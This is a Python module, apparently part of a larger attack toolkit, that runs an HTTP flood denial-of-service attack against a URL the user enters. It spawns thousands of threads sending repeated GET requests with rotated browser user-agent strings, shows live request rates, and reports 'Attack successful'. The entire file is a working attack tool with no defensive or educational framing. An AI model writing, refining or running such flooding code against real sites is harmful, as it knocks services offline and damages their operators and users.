#!/usr/bin/env python3
# Website DDoS Attack Module with Real-time Live Logs

import threading
import time
import urllib.request
import urllib.error
import random
from modules.utils import pcolor, resolve
from modules.logger import save_log

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
]

def http_flood(url, stop_event, stats):
    while not stop_event.is_set():
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            req = urllib.request.Request(url, headers=headers)
            urllib.request.urlopen(req, timeout=5)
            stats['packets'] += 1
        except:
            stats['errors'] += 1

def website_attack():
    pcolor("b", "\n[ WEBSITE ATTACK ]\n")
    
    url = input("URL (https://example.com): ")
    domain = url.replace("https://", "").replace("http://", "").split("/")[0]
    
    ip = resolve(domain)
    if not ip:
        input("Press Enter...")
        return
    
    if not url.startswith("http"):
        url = "http://" + url
    
    threads = int(input("Threads (1000-10000, default 3000): ") or 3000)
    duration = int(input("Duration in seconds (default 60): ") or 60)
    
    print(f"\nTarget: {url}")
    print(f"Threads: {threads}")
    print(f"Duration: {duration}s")
    
    confirm = input("\nStart attack? (y/n): ")
    if confirm.lower() != 'y':
        return
    
    stop_event = threading.Event()
    stats = {'packets': 0, 'errors': 0}
    
    for _ in range(threads):
        t = threading.Thread(target=http_flood, args=(url, stop_event, stats))
        t.daemon = True
        t.start()
    
    pcolor("g", f"\n[!] ATTACK STARTED on {url}")
    pcolor("y", "[!] Press Ctrl+C to stop\n")
    
    start_time = time.time()
    last_packets = 0
    last_errors = 0
    
    try:
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            
            pps = stats['packets'] - last_packets
            eps = stats['errors'] - last_errors
            
            last_packets = stats['packets']
            last_errors = stats['errors']
            
            bar_length = 30
            progress = int((elapsed / duration) * bar_length)
            bar = "█" * progress + "░" * (bar_length - progress)
            
            print(f"\r[{bar}] {elapsed}/{duration}s | "
                  f"✅ Requests: {stats['packets']:,} | "
                  f"❌ Errors: {stats['errors']:,} | "
                  f"⚡ {pps} r/s    ", end="")
            
            time.sleep(1)
        
        print()
        
    except KeyboardInterrupt:
        pcolor("y", "\n\n[!] Attack stopped by user")
    finally:
        stop_event.set()
        
        print("\n" + "="*60)
        pcolor("g", "[+] ATTACK FINISHED")
        print(f"[📊] Total requests: {stats['packets']:,}")
        print(f"[⚠️] Total errors: {stats['errors']:,}")
        print(f"[⏱️]  Actual duration: {int(time.time() - start_time)} seconds")
        
        total = stats['packets'] + stats['errors']
        if total > 0:
            success_rate = (stats['packets'] / total) * 100
            print(f"[📈] Success rate: {success_rate:.1f}%")
        
        print("="*60)
        
        save_log(url, 443, "HTTP_FLOOD", threads, duration, 
                 stats['packets'], stats['errors'])
        
        if stats['packets'] == 0:
            pcolor("r", "\n[-] No successful requests! Target may be protected.")
        else:
            pcolor("g", f"\n[+] Attack successful!")
    
    input("\nPress Enter...")
